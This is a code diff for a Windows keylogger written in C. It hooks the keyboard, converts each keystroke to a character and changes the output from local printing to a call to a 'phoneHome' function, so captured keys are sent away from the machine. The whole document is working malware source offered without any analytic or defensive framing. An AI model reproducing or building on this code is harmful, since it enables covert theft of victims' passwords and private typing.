@@ -1,4 +1,4 @@
-#include "keylogger.h"
+#include "config.h"
 
 void keylogger()
 {
@@ -36,6 +36,10 @@ LRESULT CALLBACK keyboardHook(int nCode, WPARAM wParam, LPARAM lParam)
 		")","!","@","#","$","%%","^","&","*","(",":","+","<","_",">","?","~","{","|","}","\""
 	};
 
+	TCHAR temp[10];
+	char szString[10];
+	size_t nNumCharConverted;
+
 	if (nCode == HC_ACTION)
 	{
 		if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN)
@@ -44,11 +48,18 @@ LRESULT CALLBACK keyboardHook(int nCode, WPARAM wParam, LPARAM lParam)
 			SHORT shift = GetAsyncKeyState(VK_SHIFT);
 			int code = hookStruct->vkCode;
 
-			if     (!shift && code >= 'A' && code <= 'Z') _tprintf(_T("%c"), code + 32);
-			else if (shift && code >= 48  && code <= 57)  _tprintf(shiftMap[code - 48]);
-			else if (shift && code >= 186 && code <= 192) _tprintf(shiftMap[code - 176]);
-			else if (shift && code >= 219 && code <= 222) _tprintf(shiftMap[code - 202]);
-			else printf("%s", map[code]);
+			if (!shift && code >= 'A' && code <= 'Z') 
+				sprintf_s(szString, 10, "%c", code + 32);
+			else if (shift && code >= 48  && code <= 57)  
+				sprintf_s(szString, 10, shiftMap[code - 48]);
+			else if (shift && code >= 186 && code <= 192) 
+				sprintf_s(szString, 10, shiftMap[code - 176]);
+			else if (shift && code >= 219 && code <= 222) 
+				sprintf_s(szString, 10, shiftMap[code - 202]);
+			else 
+				sprintf_s(szString, 10, "%s", map[code]);
+	
+			phoneHome(szString);
 		}
 	}
 	return CallNextHookEx(NULL, nCode, wParam, lParam);
